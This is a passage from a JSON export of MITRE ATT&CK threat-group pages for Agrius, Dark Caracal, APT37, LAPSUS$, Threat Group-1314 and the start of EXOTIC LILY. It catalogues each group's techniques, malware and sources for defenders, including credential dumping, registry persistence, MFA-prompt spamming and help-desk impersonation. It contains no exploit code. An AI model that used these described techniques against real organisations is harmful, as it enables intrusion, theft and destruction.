Wipe, Execution Guardrails, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Process Discovery, Scheduled Task/Job: Scheduled Task, System Shutdown/Reboot S0073 ASPXSpy Agrius relies on web shells for persistent access post exploitation, with an emphasis on variants of ASPXSpy.[1] Server Software Component: Web Shell S1136 BFG Agonizer BFG Agonizer has been used by Agrius for wiping operations.[5] Compromise Host Software Binary, Disk Wipe: Disk Structure Wipe, Inhibit System Recovery, System Shutdown/Reboot S1134 DEADWOOD DEADWOOD has been used by Agrius in wiping operations.[1] Account Access Removal, Data Destruction, Deobfuscate/Decode Files or Information, Disk Wipe: Disk Content Wipe, Disk Wipe: Disk Structure Wipe, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Embedded Payloads, Obfuscated Files or Information: Encrypted/Encoded File, System Services: Service Execution, System Time Discovery S1132 IPsec Helper Agrius uses IPsec Helper as a post-exploitation remote access tool framework.[1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Exfiltration Over C2 Channel, Indicator Removal, Indicator Removal: Clear Persistence, Indicator Removal: File Deletion, Lateral Tool Transfer, Modify Registry, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, System Services: Service Execution, Virtualization/Sandbox Evasion: Time Based Evasion S0002 Mimikatz Agrius used Mimikatz to dump credentials from LSASS memory.[5] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S1137 Moneybird Moneybird is associated with ransomware operations launched by Agrius.[2] Data Encrypted for Impact, Obfuscated Files or Information: Embedded Payloads S1135 MultiLayer Wiper MultiLayer Wiper is associated with wiping operations linked to Agrius.[5] Command and Scripting Interpreter: Windows Command Shell, Data Destruction, Data Manipulation: Stored Data Manipulation, Disk Wipe: Disk Structure Wipe, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Indicator Removal, Indicator Removal: File Deletion, Indicator Removal: Clear Windows Event Logs, Indicator Removal: Timestomp, Inhibit System Recovery, Obfuscated Files or Information: Embedded Payloads, Scheduled Task/Job: Scheduled Task, System Shutdown/Reboot S0590 NBTscan Agrius used NBTscan to scan victim networks for existing and accessible hosts.[5] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery References Amitai Ben & Shushan Ehrlich. (2021, May). From Wiper to Ransomware: The Evolution of Agrius. Retrieved May 21, 2024. Marc Salinas Fernandez & Jiri Vinopal. (2023, May 23). AGRIUS DEPLOYS MONEYBIRD IN TARGETED ATTACKS AGAINST ISRAELI ORGANIZATIONS. Retrieved May 21, 2024. Microsoft Threat Intelligence. (2023, May 2). Iran turning to cyber-enabled influence operations for greater effect. Retrieved May 21, 2024. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Or Chechik, Tom Fakterman, Daniel Frank & Assaf Dahan. (2023, November 6). Agonizing Serpens (Aka Agrius) Targeting the Israeli Higher Education and Tech Sectors. Retrieved May 22, 2024. "
},
{
"id": 187,
"title": "Dark Caracal, Group G0070",
"path": "/groups/G0070/index.html",
"content": " Dark Caracal Dark Caracal is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012. [1] ID: G0070 Version: 1.4 Created: 17 October 2018 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string \"&&&\".[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Dark Caracal's version of Bandook adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Dark Caracal has used macros in Word documents that would download a second stage if executed.[1] Enterprise T1005 Data from Local System Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems.[1] Enterprise T1189 Drive-by Compromise Dark Caracal leveraged a watering hole to serve up malicious code.[1] Enterprise T1083 File and Directory Discovery Dark Caracal collected file listings of all default Windows directories.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing Dark Caracal has used UPX to pack Bandook.[1] .013 Obfuscated Files or Information: Encrypted/Encoded File Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them.[1] Enterprise T1566 .003 Phishing: Spearphishing via Service Dark Caracal spearphished victims via Facebook and Whatsapp.[1] Enterprise T1113 Screen Capture Dark Caracal took screenshots using their Windows malware.[1] Enterprise T1218 .001 System Binary Proxy Execution: Compiled HTML File Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable.[1] Enterprise T1204 .002 User Execution: Malicious File Dark Caracal makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.[1] Mobile T1437 .001 Application Layer Protocol: Web Protocols Dark Caracal controls implants using standard HTTP communication.[1] Software ID Name References Techniques S0234 Bandook [1][2] Audio Capture, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Python, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Steganography, Peripheral Device Discovery, Phishing: Spearphishing Attachment, Process Injection: Process Hollowing, Screen Capture, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery, User Execution: Malicious File, Video Capture S0235 CrossRAT [1] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: XDG Autostart Entries, Create or Modify System Process: Launch Agent, File and Directory Discovery, Screen Capture S0182 FinFisher [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Token Impersonation/Theft, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Exploitation for Privilege Escalation, File and Directory Discovery, Hijack Execution Flow: DLL, Hijack Execution Flow: KernelCallbackTable, Indicator Removal: Clear Windows Event Logs, Input Capture: Credential API Hooking, Location Tracking, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Junk Code Insertion, Obfuscated Files or Information, Pre-OS Boot: Bootkit, Process Discovery, Process Injection: Dynamic-link Library Injection, Protected User Data: Call Log, Protected User Data: SMS Messages, Query Registry, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, Virtualization/Sandbox Evasion: System Checks S0399 Pallas [1] Audio Capture, Exfiltration Over C2 Channel, Indicator Removal on Host: File Deletion, Input Capture: GUI Input Capture, Location Tracking, Obfuscated Files or Information, Protected User Data: Call Log, Protected User Data: Contact List, Protected User Data: SMS Messages, Software Discovery, Stored Application Data, System Information Discovery, System Network Connections Discovery, Video Capture References Blaich, A., et al. (2018, January 18). Dark Caracal: Cyber-espionage at a Global Scale. Retrieved April 11, 2018. Check Point. (2020, November 26). Bandook: Signed & Delivered. Retrieved May 31, 2021. "
},
{
"id": 188,
"title": "APT37, InkySquid, ScarCruft, Reaper, Group123, TEMP.Reaper, Ricochet Chollima, Group G0067",
"path": "/groups/G0067/index.html",
"content": " APT37 APT37 is a North Korean state-sponsored cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. APT37 has also been linked to the following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, North Korean Human Rights, and Evil New Year 2018.[1][2][3] North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups. ID: G0067 \u24d8 Associated Groups: InkySquid, ScarCruft, Reaper, Group123, TEMP.Reaper, Ricochet Chollima Contributors: Valerii Marchuk, Cybersecurity Help s.r.o. Version: 2.0 Created: 18 April 2018 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description InkySquid [4] ScarCruft [2][1][5] Reaper [1] Group123 [1] TEMP.Reaper [1] Ricochet Chollima [6] Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.[5] Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT37 uses HTTPS to conceal C2 communications.[3] Enterprise T1123 Audio Capture APT37 has used an audio capturing utility known as SOUNDWAVE that captures microphone input.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT37's has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\.[1][3] Enterprise T1059 Command and Scripting Interpreter APT37 has used Ruby scripts to execute payloads.[7] .003 Windows Command Shell APT37 has used the command-line interface.[1][3] .005 Visual Basic APT37 executes shellcode and a VBA script to decode Base64 strings.[3] .006 Python APT37 has used Python scripts to execute payloads.[7] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers APT37 has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.[1] Enterprise T1005 Data from Local System APT37 has collected data from victims' local systems.[1] Enterprise T1561 .002 Disk Wipe: Disk Structure Wipe APT37 has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).[1][3] Enterprise T1189 Drive-by Compromise APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.[2][1][4] Enterprise T1203 Exploitation for Client Execution APT37 has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.[2][1][3][4] Enterprise T1105 Ingress Tool Transfer APT37 has downloaded second stage malware from compromised websites.[1][5][4][7] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange APT37 has used Windows DDE for execution of commands and a malicious VBS.[2] Enterprise T1036 .001 Masquerading: Invalid Code Signature APT37 has signed its malware with an invalid digital certificates listed as \"Tencent Technology (Shenzhen) Company Limited.\"[2] Enterprise T1106 Native API APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.[3] Enterprise T1027 Obfuscated Files or Information APT37 obfuscates strings and payloads.[3][5][7] .003 Steganography APT37 uses steganography to send images to users that are embedded with shellcode.[3][5] Enterprise T1120 Peripheral Device Discovery APT37 has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. [5] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT37 delivers malware using spearphishing emails with malicious HWP attachments.[1][3][5] Enterprise T1057 Process Discovery APT37's Freenki malware lists running processes using the Microsoft Windows API.[3] Enterprise T1055 Process Injection APT37 injects its malware variant, ROKRAT, into the cmd.exe process.[3] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task APT37 has created scheduled tasks to run malicious scripts on a compromised host.[7] Enterprise T1082 System Information Discovery APT37 collects the computer name, the BIOS model, and execution path.[3] Enterprise T1033 System Owner/User Discovery APT37 identifies the victim username.[3] Enterprise T1529 System Shutdown/Reboot APT37 has used malware that will issue the command shutdown /r /t 1 to reboot a system after wiping its MBR.[3] Enterprise T1204 .002 User Execution: Malicious File APT37 has sent spearphishing attachments attempting to get a user to open them.[1] Enterprise T1102 .002 Web Service: Bidirectional Communication APT37 leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.[1][3] Software ID Name References Techniques S0657 BLUELIGHT [4] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Custom Method, Archive Collected Data, Credentials from Password Stores: Credentials from Web Browsers, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Screen Capture, Software Discovery: Security Software Discovery, Steal Web Session Cookie, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery, Virtualization/Sandbox Evasion: System Checks, Web Service: Bidirectional Communication S0154 Cobalt Strike [4] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0212 CORALDECK [1] Archive Collected Data: Archive via Utility, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, File and Directory Discovery S0213 DOGCALL [1][8] Audio Capture, Ingress Tool Transfer, Input Capture: Keylogging, Obfuscated Files or Information: Encrypted/Encoded File, Screen Capture, Web Service: Bidirectional Communication S0355 Final1stspy [8] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Deobfuscate/Decode Files or Information, Obfuscated Files or Information, Process Discovery, System Information Discovery S0214 HAPPYWORK [1] Ingress Tool Transfer, System Information Discovery, System Owner/User Discovery S0215 KARAE [1] Drive-by Compromise, Ingress Tool Transfer, System Information Discovery, Web Service: Bidirectional Communication S0247 NavRAT [9] Application Layer Protocol: Mail Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Staged: Local Data Staging, Ingress Tool Transfer, Input Capture: Keylogging, Process Discovery, Process Injection, System Information Discovery S0216 POORAIM [1] Drive-by Compromise, File and Directory Discovery, Process Discovery, Screen Capture, System Information Discovery, Web Service: Bidirectional Communication S0240 ROKRAT [3][5] Application Layer Protocol: Web Protocols, Application Window Discovery, Audio Capture, Clipboard Data, Command and Scripting Interpreter: Visual Basic, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Debugger Evasion, Deobfuscate/Decode Files or Information, Execution Guardrails: Environmental Keying, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Obfuscated Files or Information, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Query Registry, Screen Capture, System Information Discovery, System Owner/User Discovery, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Web Service: Bidirectional Communication S0217 SHUTTERSPEED [1] Ingress Tool Transfer, Screen Capture, System Information Discovery S0218 SLOWDRIFT [1] Ingress Tool Transfer, System Information Discovery, Web Service: Bidirectional Communication S0219 WINERACK [1] Application Window Discovery, Command and Scripting Interpreter, File and Directory Discovery, Process Discovery, System Information Discovery, System Owner/User Discovery, System Service Discovery References FireEye. (2018, February 20). APT37 (Reaper): The Overlooked North Korean Actor. Retrieved November 17, 2024. Raiu, C., and Ivanov, A. (2016, June 17). Operation Daybreak. Retrieved February 15, 2018. Mercer, W., Rascagneres, P. (2018, January 16). Korea In The Crosshairs. Retrieved May 21, 2018. Cash, D., Grunzweig, J., Meltzer, M., Adair, S., Lancaster, T. (2021, August 17). North Korean APT InkySquid Infects Victims Using Browser Exploits. Retrieved September 30, 2021. GReAT. (2019, May 13). ScarCruft continues to evolve, introduces Bluetooth harvester. Retrieved June 4, 2019. CrowdStrike. (2021, September 30). Adversary Profile - Ricochet Chollima. Retrieved September 30, 2021. Cash, D., Grunzweig, J., Adair, S., Lancaster, T. (2021, August 25). North Korean BLUELIGHT Special: InkySquid Deploys RokRAT. Retrieved October 1, 2021. Grunzweig, J. (2018, October 01). NOKKI Almost Ties the Knot with DOGCALL: Reaper Group Uses New Malware to Deploy RAT. Retrieved November 5, 2018. Mercer, W., Rascagneres, P. (2018, May 31). NavRAT Uses US-North Korea Summit As Decoy For Attacks In South Korea. Retrieved June 11, 2018. "
},
{
"id": 189,
"title": "LAPSUS$, DEV-0537, Strawberry Tempest, Group G1004",
"path": "/groups/G1004/index.html",
"content": " LAPSUS$ LAPSUS$ is cyber criminal threat group that has been active since at least mid-2021. LAPSUS$ specializes in large-scale social engineering and extortion operations, including destructive attacks without the use of ransomware. The group has targeted organizations globally, including in the government, manufacturing, higher education, energy, healthcare, technology, telecommunications, and media sectors.[1][2][3] ID: G1004 \u24d8 Associated Groups: DEV-0537, Strawberry Tempest Contributors: David Hughes, BT Security; Matt Brenton, Zurich Insurance Group; Flavio Costa, Cisco; Caio Silva Version: 2.1 Created: 09 June 2022 Last Modified: 07 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description DEV-0537 [2] Strawberry Tempest [4] Techniques Used Domain ID Name Use Enterprise T1531 Account Access Removal LAPSUS$ has removed a targeted organization's global admin accounts to lock the organization out of all access.[2] Enterprise T1087 .002 Account Discovery: Domain Account LAPSUS$ has used the AD Explorer tool to enumerate users on a victim's network.[2][5] Enterprise T1098 .003 Account Manipulation: Additional Cloud Roles LAPSUS$ has added the global admin role to accounts they have created in the targeted organization's cloud instances.[2] Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server LAPSUS$ has used VPS hosting providers for infrastructure.[2] Enterprise T1586 .002 Compromise Accounts: Email Accounts LAPSUS$ has payed employees, suppliers, and business partners of target organizations for credentials.[2][5] Enterprise T1584 .002 Compromise Infrastructure: DNS Server LAPSUS$ has reconfigured a victim's DNS records to actor-controlled domains and websites.[5] Enterprise T1136 .003 Create Account: Cloud Account LAPSUS$ has created global admin accounts in the targeted organization's cloud instances to gain persistence.[2] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers LAPSUS$ has obtained passwords and session tokens with the use of the Redline password stealer.[2] .005 Credentials from Password Stores: Password Managers LAPSUS$ has accessed local password managers and databases to obtain further credentials from a compromised network.[5] Enterprise T1485 Data Destruction LAPSUS$ has deleted the target's systems and resources both on-premises and in the cloud.[2][5] Enterprise T1213 .001 Data from Information Repositories: Confluence LAPSUS$ has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials.[2] .002 Data from Information Repositories: Sharepoint LAPSUS$ has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials.[2][5] .003 Data from Information Repositories: Code Repositories LAPSUS$ has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials.[2][5] .005 Data from Information Repositories: Messaging Applications LAPSUS$ has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials.[2] Enterprise T1005 Data from Local System LAPSUS$ uploaded sensitive files, information, and credentials from a targeted organization for extortion or public release.[2] Enterprise T1114 .003 Email Collection: Email Forwarding Rule LAPSUS$ has set an Office 365 tenant level mail transport rule to send all mail in and out of the targeted organization to the newly created account.[2] Enterprise T1068 Exploitation for Privilege Escalation LAPSUS$ has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation.[2] Enterprise T1133 External Remote Services LAPSUS$ has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. [2][5] Enterprise T1589 Gather Victim Identity Information LAPSUS$ has gathered detailed information of target employees to enhance their social engineering lures.[2] .001 Credentials LAPSUS$ has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials.[2][5] .002 Email Addresses LAPSUS$ has gathered employee email addresses, including personal accounts, for social engineering and initial access efforts.[2] Enterprise T1591 .002 Gather Victim Org Information: Business Relationships LAPSUS$ has gathered detailed knowledge of an organization's supply chain relationships.[2] .004 Gather Victim Org Information: Identify Roles LAPSUS$ has gathered detailed knowledge of team structures within a target organization.[2] Enterprise T1656 Impersonation LAPSUS$ has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts.[2] Enterprise T1578 .002 Modify Cloud Compute Infrastructure: Create Cloud Instance LAPSUS$ has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets.[2] .003 Modify Cloud Compute Infrastructure: Delete Cloud Instance LAPSUS$ has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process.[2] Enterprise T1111 Multi-Factor Authentication Interception LAPSUS$ has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval.[2] Enterprise T1621 Multi-Factor Authentication Request Generation LAPSUS$ has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval.[2] Enterprise T1588 .001 Obtain Capabilities: Malware LAPSUS$ acquired and used the Redline password stealer in their operations.[2] .002 Obtain Capabilities: Tool LAPSUS$ has obtained tools such as RVTools and AD Explorer for their operations.[2][5] Enterprise T1003 .003 OS Credential Dumping: NTDS LAPSUS$ has used Windows built-in tool ntdsutil to extract the Active Directory (AD) database.[2] .006 OS Credential Dumping: DCSync LAPSUS$ has used DCSync attacks to gather credentials for privilege escalation routines.[2] Enterprise T1069 .002 Permission Groups Discovery: Domain Groups LAPSUS$ has used the AD Explorer tool to enumerate groups on a victim's network.[2] Enterprise T1598 .004 Phishing for Information: Spearphishing Voice LAPSUS$ has called victims' help desk to convince the support personnel to reset a privileged account\u2019s credentials.[2] Enterprise T1090 Proxy LAPSUS$ has leverage NordVPN for its egress points when targeting intended victims.[2] Enterprise T1597 .002 Search Closed Sources: Purchase Technical Data LAPSUS$ has purchased credentials and session tokens from criminal underground forums.[2] Enterprise T1593 .003 Search Open Websites/Domains: Code Repositories LAPSUS$ has searched public code repositories for exposed credentials.[2] Enterprise T1489 Service Stop LAPSUS$ has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure.[5] Enterprise T1199 Trusted Relationship LAPSUS$ has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations.[2] Enterprise T1552 .008 Unsecured Credentials: Chat Messages LAPSUS$ has targeted various collaboration tools like Slack, Teams, JIRA, Confluence, and others to hunt for exposed credentials to support privilege escalation and lateral movement.[2] Enterprise T1204 User Execution LAPSUS$ has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing LAPSUS$ to take control of an authenticated system.[2] Enterprise T1078 Valid Accounts LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs.[2][5] .004 Cloud Accounts LAPSUS$ has used compromised credentials to access cloud assets within a target organization.[2] Mobile T1451 SIM Card Swap LAPSUS$ has used SIM swapping to gain access to victims\u2019 mobile devices.[6][7] Software ID Name References Techniques S0002 Mimikatz [2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket References BBC. (2022, April 1). LAPSUS: Two UK Teenagers Charged with Hacking for Gang. Retrieved June 9, 2022. MSTIC, DART, M365 Defender. (2022, March 24). DEV-0537 Criminal Actor Targeting Organizations for Data Exfiltration and Destruction. Retrieved May 17, 2022. UNIT 42. (2022, March 24). Threat Brief: Lapsus$ Group. Retrieved May 17, 2022. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Brown, D., et al. (2022, April 28). LAPSUS$: Recent techniques, tactics and procedures. Retrieved December 22, 2022. Krebs, B. (2022, March 23). A Closer Look at the LAPSUS$ Data Extortion Group. Retrieved January 27, 2025. Microsoft Incident Response, Microsoft Threat Intelligence . (2022, March 22). DEV-0537 criminal actor targeting organizations for data exfiltration and destruction. Retrieved January 27, 2025. "
},
{
"id": 190,
"title": "Threat Group-1314, TG-1314, Group G0028",
"path": "/groups/G0028/index.html",
"content": " Threat Group-1314 Threat Group-1314 is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure. [1] ID: G0028 \u24d8 Associated Groups: TG-1314 Version: 1.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description TG-1314 [1] Techniques Used Domain ID Name Use Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Threat Group-1314 actors spawned shells on remote systems on a victim network to execute commands.[1] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Threat Group-1314 actors mapped network drives using net use.[1] Enterprise T1072 Software Deployment Tools Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement.[1] Enterprise T1078 .002 Valid Accounts: Domain Accounts Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.[1] Software ID Name References Techniques S0039 Net [1] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution References Dell SecureWorks Counter Threat Unit Special Operations Team. (2015, May 28). Living off the Land. Retrieved January 26, 2016. "
},
{
"id": 191,
"title": "EXOTIC LILY, Group G1011",
"path": "/groups/G1011/index.html",
"content": " EXOTIC LILY EXOTIC LILY is a financially motivated group that has been closely linked with Wizard Spider and the deployment of ransomware including Conti and Diavol. EXOTIC LILY may be acting as an initial access broker for other malicious actors, and has targeted a wide range of industries including IT, cybersecurity, and healthcare since at least September 2021.[1] ID: G1011 Contributors: Phill Taylor, BT Security Version: 1.0 Created: 18 August 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains EXOTIC LILY has registered domains to spoof targeted organizations by changing the top-level domain (TLD) to \".us\", \".co\" or \".biz\".[1] Enterprise T1585 .001 Establish Accounts: Social Media Accounts EXOTIC LILY has established social media profiles to mimic employees of targeted companies.[1] .002 Establish Accounts: Email Accounts EXOTIC LILY has created e-mail accounts to spoof targeted organizations.[1] Enterprise T1203 Exploitation for Client Execution EXOTIC LILY has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML.[1] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses EXOTIC LILY has gathered targeted individuals' e-mail addresses through open source research and website contact forms.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment EXOTIC LILY conducted an e-mail thread-hijacking campaign with malicious ISO attachments.[1][2] .002 Phishing: Spearphishing Link EXOTIC LILY has relied on victims to open malicious links in e-mails for execution.[1] .003 Phishing: Spearphishing via Service EXOTIC LILY has used the e-mail notification features of legitimate file sharing services for spearphishing.[1] Enterprise T1597 Search Closed Sources EXOTIC LILY has searched for information on targeted individuals on business databases including RocketReach and 